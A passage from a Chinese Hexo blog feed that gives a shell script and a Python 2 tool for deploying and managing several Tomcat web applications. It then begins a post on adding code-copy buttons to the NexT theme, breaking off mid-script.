class="variable">$&#123;soft_dir&#125;</span>/tomcat"</span></div><div class="line marked"><span class="built_in">export</span> JVM_OPTIONS=<span class="string">"-Xms528m -Xmx812m -Xmn328m"</span></div><div class="line"></div><div class="line">[ -d <span class="string">"<span class="variable">$&#123;soft_dir&#125;</span>/war_apps"</span> ] || mkdir <span class="variable">$&#123;soft_dir&#125;</span>/war_apps</div><div class="line"></div><div class="line">[ `<span class="built_in">which</span> unzip` ] || yum -y -q install unzip &gt;/dev/null 2&gt;&amp;1</div><div class="line"></div><div class="line"><span class="function"><span class="title">check</span></span>()&#123;</div><div class="line">    PID=`ps aux|grep java|grep -w <span class="variable">$&#123;CATALINA_BASE&#125;</span>|awk <span class="string">'&#123;print $2&#125;'</span>`</div><div class="line">    <span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$PID</span>"</span> ];<span class="keyword">then</span></div><div class="line">        <span class="built_in">echo</span> -e <span class="string">"\033[94m <span class="variable">$app</span> is running PID:<span class="variable">$PID</span>"</span></div><div class="line">        running=`netstat -ntlp|grep <span class="variable">$PID</span>|grep 127.0.0.1`</div><div class="line">        <span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$running</span>"</span> ];<span class="keyword">then</span></div><div class="line">            <span class="built_in">echo</span> -e <span class="string">"\033[92m <span class="variable">$app</span> is provide services\033[0m "</span></div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="built_in">echo</span> -e <span class="string">"\033[93m <span class="variable">$app</span> is running but not provide services\033[0m"</span></div><div class="line">        <span class="keyword">fi</span></div><div class="line">        <span class="built_in">return</span> 0</div><div class="line"></div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="built_in">echo</span> -e <span class="string">"\033[91m <span class="variable">$app</span> is dead\033[0m "</span></div><div class="line">        <span class="built_in">return</span> 1</div><div class="line">    <span class="keyword">fi</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">start</span></span>() &#123;</div><div class="line">    check</div><div class="line">    <span class="keyword">if</span> [ $? -eq 1 ];<span class="keyword">then</span></div><div class="line">        <span class="built_in">echo</span> -e <span class="string">"\033[94m Start <span class="variable">$app</span> \033[0m"</span></div><div class="line">        <span class="variable">$CATALINA_HOME</span>/bin/startup.sh &gt;/dev/null 2&gt;&amp;1</div><div class="line">    <span class="keyword">fi</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">stop</span></span>() &#123;</div><div class="line">    check</div><div class="line">    <span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></div><div class="line">        <span class="built_in">echo</span> -e <span class="string">"\033[94m Stop <span class="variable">$app</span>\033[0m"</span></div><div class="line">        <span class="variable">$CATALINA_HOME</span>/bin/shutdown.sh &gt;/dev/null 2&gt;&amp;1</div><div class="line">        <span class="built_in">kill</span> -9 <span class="variable">$PID</span></div><div class="line">    <span class="keyword">fi</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">update</span></span>() &#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"下载文件"</span></div><div class="line">    wget <span class="variable">$&#123;war_url&#125;</span> -O <span class="variable">$&#123;download_war_file&#125;</span> &gt; /dev/null 2&gt;&amp;1</div><div class="line">    <span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></div><div class="line">        <span class="built_in">cd</span> <span class="variable">$&#123;CATALINA_BASE&#125;</span>/webapps/*/; unzip -q -o <span class="variable">$&#123;download_war_file&#125;</span> &gt;/dev/null 2&gt;&amp;1</div><div class="line">    <span class="keyword">fi</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">log</span></span>() &#123;</div><div class="line">    tailf <span class="variable">$&#123;CATALINA_BASE&#125;</span>/logs/catalina.out</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> != <span class="string">"0"</span> ];<span class="keyword">then</span></div><div class="line">    <span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></div><div class="line">        start)</div><div class="line">            start</div><div class="line">            ;;</div><div class="line">        stop)</div><div class="line">            stop</div><div class="line">            ;;</div><div class="line">        restart)</div><div class="line">            stop</div><div class="line">            start </div><div class="line">            ;;</div><div class="line">        status)</div><div class="line">            check</div><div class="line">            ;;</div><div class="line">        upgrade)</div><div class="line">            stop</div><div class="line">            update</div><div class="line">            start</div><div class="line">            ;;</div><div class="line">        <span class="built_in">log</span>)</div><div class="line">            <span class="built_in">log</span></div><div class="line">            ;;</div><div class="line">        *)</div><div class="line">            <span class="built_in">echo</span> $<span class="string">"Usage: <span class="variable">$0</span> &#123;start|stop|restart|status|upgrade|log&#125;"</span></div><div class="line">            <span class="built_in">exit</span> 1</div><div class="line">            ;;</div><div class="line">    <span class="keyword">esac</span></div><div class="line"><span class="keyword">else</span></div><div class="line">    start</div><div class="line">    <span class="built_in">log</span></div><div class="line"><span class="keyword">fi</span></div></pre></div></div></figure><hr><h2 id="2-添加总控制台脚本"><a href="#2-添加总控制台脚本" class="headerlink" title="2.添加总控制台脚本"></a>2.添加总控制台脚本</h2><blockquote><p>我就放在了<code>/usr/local/bin</code>下, <code>chmod +x /usr/local/bin/tomcat_manager</code> 蓝色部分需要根据自己需求更改 (支持python2)</p></blockquote><figure class="highlight python"><figcaption><span class="fileDir">/usr/local/bin/</span><span class="caption">tomcat_manager</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Time    : 2018/5/23 15:18</span></div><div class="line"><span class="comment"># @Author  : Kionf</span></div><div class="line"><span class="comment"># @FileName: tomcat_manager.py</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">#   初始配置并管理单例tomcat多应用</span></div><div class="line"><span class="comment">#</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> shutil</div><div class="line"></div><div class="line"><span class="comment"># PATH = os.getcwd()</span></div><div class="line marked">PATH = <span class="string">"/opt/op/tomcat"</span><span class="comment">#Tomcat目录</span></div><div class="line marked">shell_script = os.path.join(PATH, <span class="string">"manage.sh"</span>)<span class="comment">#更新启停管理脚本</span></div><div class="line">INIT_FILES = os.path.join(PATH, <span class="string">"INIT_APPS_FILE"</span>)</div><div class="line marked">bucket = <span class="string">"https://oss.aliyuncs.com/tomcat_app/"</span><span class="comment"># webapp下载地址</span></div><div class="line"></div><div class="line">config_data = &#123;</div><div class="line">    <span class="comment"># 应用名: [ServerPort, ConnectPort, AJPPort, RedirectPort, ]</span></div><div class="line marked">    <span class="string">'Application'</span>: [<span class="string">'8201'</span>, <span class="string">'8101'</span>, <span class="string">'8301'</span>, <span class="string">'8401'</span>, <span class="string">'BaseApplication.war'</span>],</div><div class="line marked">    <span class="string">'BaseNotify_Service'</span>: [<span class="string">'8202'</span>, <span class="string">'8102'</span>, <span class="string">'8302'</span>, <span class="string">'8402'</span>, <span class="string">'BaseNotify_Service.war'</span>],</div><div class="line marked">    <span class="string">'BaseUserCenter_Service'</span>: [<span class="string">'8203'</span>, <span class="string">'8103'</span>, <span class="string">'8303'</span>, <span class="string">'8403'</span>, <span class="string">'BaseUserCenter_Service.war'</span>],</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">customize_print</span><span class="params">(msg, stat=<span class="number">0</span>)</span>:</span></div><div class="line">    <span class="keyword">if</span> stat == <span class="number">1</span>:</div><div class="line">        print(<span class="string">"\033[91m [ERROR]:  %s \033[0m"</span> % msg)</div><div class="line">    <span class="keyword">elif</span> stat == <span class="number">0</span>:</div><div class="line">        print(<span class="string">"\033[92m [INFO]:  %s \033[0m"</span> % msg)</div><div class="line">    <span class="keyword">elif</span> stat == <span class="number">2</span>:</div><div class="line">        print(<span class="string">"\033[93m [DEBUG]:  %s \033[0m"</span> % msg)</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">TomcatAppsManage</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, webapp)</span>:</span></div><div class="line">        self.name = webapp</div><div class="line">        self.app_config = config_data[self.name]</div><div class="line">        self.manage_shell_file = os.path.join(PATH, self.name, self.name)</div><div class="line">        self.server_port, self.conn_port, self.ajp_port, self.redirect_port, self.app_war_name = self.app_config</div><div class="line">        self.app_download_url = bucket + self.app_war_name</div><div class="line">        self.config_file = os.path.join(PATH, self.name, <span class="string">'conf/server.xml'</span>)</div><div class="line">        self.webapp_dir = os.path.join(PATH, self.name)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line"><span class="string">        创建app</span></div><div class="line"><span class="string">        :return:</span></div><div class="line"><span class="string">        """</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.webapp_dir):</div><div class="line">            customize_print(<span class="string">"创建APP: %s"</span> % self.name)</div><div class="line">            shutil.copytree(INIT_FILES, self.webapp_dir)</div><div class="line">            os.mkdir(os.path.join(self.webapp_dir, <span class="string">"webapps"</span>, self.name.lower()))</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">config_app_port</span><span class="params">(self)</span>:</span></div><div class="line">        customize_print(<span class="string">"正在修改APP：%s 配置"</span> % self.name)</div><div class="line">        change_port = &#123;</div><div class="line">            <span class="string">'ServerPort'</span>: <span class="string">"sed -i s'#Server port=\"[0-9]*\"#Server port=\""</span> + self.server_port + <span class="string">"\"#'g "</span> + self.config_file,</div><div class="line">            <span class="string">'ConnPort'</span>: <span class="string">"sed -i s'#Connector port=\"[0-9]*\" protocol=\"HTTP/1.1\"#Connector port=\""</span> + self.conn_port + <span class="string">"\" protocol=\"HTTP/1.1\"#'g "</span> + self.config_file,</div><div class="line">            <span class="string">'RedirectPort'</span>: <span class="string">"sed -i s'#redirectPort=\"[0-9]*\"#redirectPort=\""</span> + self.redirect_port + <span class="string">"\"#'g "</span> + self.config_file,</div><div class="line">            <span class="string">'AjpPort'</span>: <span class="string">"sed -i s'#Connector port=\"[0-9]*\" protocol=\"AJP/1.3\"#Connector port=\""</span> + self.ajp_port + <span class="string">"\" protocol=\"AJP/1.3\"#'g "</span> + self.config_file,</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> change_port.keys():</div><div class="line">            <span class="comment"># customize_print("修改 %s 端口" % port)</span></div><div class="line">            os.system(change_port[port])</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">config_app_manage_shell</span><span class="params">(self)</span>:</span></div><div class="line">        customize_print(<span class="string">"%s 添加管理脚本"</span> % self.name)</div><div class="line">        copy_shell_script = <span class="string">'cp -f '</span> + shell_script + <span class="string">' '</span> + self.manage_shell_file</div><div class="line">        os.system(copy_shell_script)</div><div class="line">        config_script_app_name = <span class="string">"sed -i 's/app=/app=\""</span> + self.name + <span class="string">"\"/' "</span> + self.manage_shell_file</div><div class="line">        os.system(config_script_app_name)</div><div class="line">        config_script_war_url = <span class="string">"sed -i 's#war_url=#war_url=\""</span> + self.app_download_url + <span class="string">"\"#' "</span> + self.manage_shell_file</div><div class="line">        os.system(config_script_war_url)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">status_app</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line"><span class="string">        :return: 0提供服务，1停止，2未提供服务</span></div><div class="line"><span class="string">        """</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            result = subprocess.check_output([<span class="string">'sh'</span>, self.manage_shell_file, <span class="string">'status'</span>])</div><div class="line">        <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</div><div class="line">            result = e.output</div><div class="line">        <span class="keyword">if</span> <span class="string">'run'</span> <span class="keyword">in</span> result:</div><div class="line">            <span class="keyword">if</span> <span class="string">'is provide services'</span> <span class="keyword">in</span> result:</div><div class="line">                customize_print(<span class="string">"应用 %s 成功启动并提供服务"</span> % self.name)</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span></div><div class="line">            <span class="keyword">elif</span> <span class="string">'but'</span> <span class="keyword">in</span> result:</div><div class="line">                customize_print(<span class="string">"应用 %s 进程存在但未提供服务"</span> % self.name, <span class="number">2</span>)</div><div class="line">                <span class="keyword">return</span> <span class="number">2</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            customize_print(<span class="string">"应用 %s 以停止"</span> % self.name, <span class="number">1</span>)</div><div class="line">            <span class="keyword">return</span> <span class="number">1</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">manage</span><span class="params">(self, operate)</span>:</span></div><div class="line">        os.system(<span class="string">'sh %s %s'</span> % (self.manage_shell_file, operate))</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(self)</span>:</span></div><div class="line">        self.create_app()</div><div class="line">        self.config_app_port()</div><div class="line">        self.config_app_manage_shell()</div><div class="line">        self.manage(<span class="string">"upgrade"</span>)</div><div class="line">        self.manage(<span class="string">"stop"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">restart</span><span class="params">(self)</span>:</span></div><div class="line">        self.manage(<span class="string">"stop"</span>)</div><div class="line">        self.manage(<span class="string">"start"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></div><div class="line">        self.manage(<span class="string">"start"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stop</span><span class="params">(self)</span>:</span></div><div class="line">        self.manage(<span class="string">"stop"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(self)</span>:</span></div><div class="line">        self.manage(<span class="string">"log"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(self)</span>:</span></div><div class="line">        self.lock_config_file()</div><div class="line">        self.manage(<span class="string">"upgrade"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lock_config_file</span><span class="params">(self)</span>:</span></div><div class="line">        cmd = <span class="string">'find '</span> + self.webapp_dir + <span class="string">' -name db*properties -o -name config_base_*|xargs chattr +i &gt;/dev/null 2&gt;&amp;1'</span></div><div class="line">        customize_print(<span class="string">"锁配置文件"</span>, <span class="number">2</span>)</div><div class="line">        os.system(cmd)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unlock_config_file</span><span class="params">(self)</span>:</span></div><div class="line">        cmd = <span class="string">'find '</span> + self.webapp_dir + <span class="string">' -name db*properties -o -name config_base_*|xargs chattr -i &gt;/dev/null 2&gt;&amp;1'</span></div><div class="line">        customize_print(<span class="string">"解锁配置文件"</span>, <span class="number">2</span>)</div><div class="line">        os.system(cmd)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dash_board</span><span class="params">(apps, operate)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line"><span class="string">    主管理程序，调用</span></div><div class="line"><span class="string">    :param operate: 应用操作</span></div><div class="line"><span class="string">    :param apps: apps 为list</span></div><div class="line"><span class="string">    """</span></div><div class="line">    <span class="keyword">for</span> app <span class="keyword">in</span> apps:</div><div class="line">        app_obj = TomcatAppsManage(app)</div><div class="line">        main_dict = &#123;</div><div class="line">            <span class="string">"init"</span>: app_obj.init,</div><div class="line">            <span class="string">"shell"</span>: app_obj.config_app_manage_shell,</div><div class="line">            <span class="string">"status"</span>: app_obj.status_app,</div><div class="line">            <span class="string">"start"</span>: app_obj.start,</div><div class="line">            <span class="string">"stop"</span>: app_obj.stop,</div><div class="line">            <span class="string">"restart"</span>: app_obj.restart,</div><div class="line">            <span class="string">"upgrade"</span>: app_obj.upgrade,</div><div class="line">            <span class="string">"log"</span>: app_obj.log,</div><div class="line">            <span class="string">"lock"</span>: app_obj.lock_config_file,</div><div class="line">            <span class="string">"unlock"</span>: app_obj.unlock_config_file,</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            main_dict[operate]()</div><div class="line">        <span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</div><div class="line">            customize_print(help_msg)</div><div class="line"></div><div class="line"></div><div class="line">help_msg = <span class="string">"""</span></div><div class="line"><span class="string">使用方法：</span></div><div class="line"><span class="string">    1 log</span></div><div class="line"><span class="string">    all status</span></div><div class="line"><span class="string">    管理应用编号 操作</span></div><div class="line"><span class="string">操作：</span></div><div class="line"><span class="string">    lock        锁配置文件</span></div><div class="line"><span class="string">    unlock      解锁配置文件</span></div><div class="line"><span class="string">    init        配置tomcat监听端口</span></div><div class="line"><span class="string">    shell       配置webapp控制脚本</span></div><div class="line"><span class="string">    status，start，restart, log，upgrade，stop 应用操作</span></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    app_list = []</div><div class="line">    <span class="keyword">for</span> index, app_name <span class="keyword">in</span> enumerate(config_data, <span class="number">1</span>):</div><div class="line">        <span class="keyword">print</span> <span class="string">"\033[94m %s:  %s \033[0m"</span> % (index, app_name)</div><div class="line">        app_list.append(app_name)</div><div class="line">    choice = raw_input(<span class="string">"输入要管理的服务:  "</span>)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        app_index = choice.split()[<span class="number">0</span>]</div><div class="line">        operate = choice.split()[<span class="number">1</span>]</div><div class="line">        <span class="keyword">if</span> app_index.isdigit():</div><div class="line">            app_index = int(app_index)</div><div class="line">            <span class="keyword">if</span> len(app_list) &gt;= app_index &gt; <span class="number">0</span>:</div><div class="line">                app_name = app_list[app_index - <span class="number">1</span>]</div><div class="line">                dash_board(app_name.split(), operate)</div><div class="line">        <span class="keyword">elif</span> app_index == <span class="string">"all"</span>:</div><div class="line">            dash_board(app_list, operate)</div><div class="line">    <span class="keyword">except</span> ValueError <span class="keyword">and</span> IndexError:</div><div class="line">        customize_print(<span class="string">"参数输入错误"</span>, <span class="number">1</span>)</div><div class="line">        customize_print(help_msg)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        dash_board(sys.argv[<span class="number">1</span>].split(), sys.argv[<span class="number">2</span>])</div><div class="line">    <span class="keyword">except</span> IndexError:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">                main()</div><div class="line">        <span class="keyword">except</span> KeyboardInterrupt:</div><div class="line">            customize_print(<span class="string">"Bye!"</span>)</div></pre></div></div></figure><hr><h1 id="0x02-开始初始化部署"><a href="#0x02-开始初始化部署" class="headerlink" title="0x02 开始初始化部署"></a>0x02 开始初始化部署</h1><p>执行<code>tomcat_manager</code></p><p><img src="https://kionf.com/article_images/tomcat-manager.png" alt="kionf"></p><blockquote><p><code>all init</code> 自动初始化部署所有项目, 其他具体使用方法见帮助信息</p></blockquote><hr>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
          <category> Tomcat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hexo next代码片段添加代码块复制和长代码自动展开</title>
      <link href="/2018/06/28/blog-next/"/>
      <url>/2018/06/28/blog-next/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/blog-code.png" alt="kionf"></p><blockquote class="blockquote-center"><p>添加鼠标移动到长代码块, 自动展开.  代码块复制按钮及定制</p></blockquote><a id="more"></a><h1 id="0x00-添加第三方js插件clipboard-js"><a href="#0x00-添加第三方js插件clipboard-js" class="headerlink" title="0x00 添加第三方js插件clipboard.js"></a>0x00 添加第三方js插件<a href="https://clipboardjs.com/" target="_blank" rel="noopener">clipboard.js</a></h1><ul><li><i class="fa fa-download"></i> <a href="https://raw.githubusercontent.com/zenorocha/clipboard.js/master/dist/clipboard.min.js" target="_blank" rel="noopener">下载</a></li></ul><blockquote><p> ./themes/next/source/lib/zclip/clipboard.min.js <code>新增</code></p></blockquote><hr><h1 id="0x01-插入自定义javascript"><a href="#0x01-插入自定义javascript" class="headerlink" title="0x01 插入自定义javascript"></a>0x01 插入自定义javascript</h1><p>新增<code>custom.js</code>文件, 目录如下</p><blockquote><p>./themes/next/source/js/src/custom.js <code>新增</code></p></blockquote><figure class="highlight js"><figcaption><span class="fileDir">./themes/next/source/js/src/</span><span class="caption">custom</span><span class="suffix">.js</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">var</span> browserHeight = <span class="built_in">document</span>.documentElement.clientHeight || <span class="built_in">document</span>.body.clientHeight;</div><div class="line"><span class="keyword">var</span> scrollTop = <span class="built_in">document</span>.documentElement.scrollTop || <span class="built_in">document</span>.body.scrollTop;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">createCopyBtns</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// 创建复制button 对象</span></div><div class="line">    <span class="keyword">var</span> $figure = 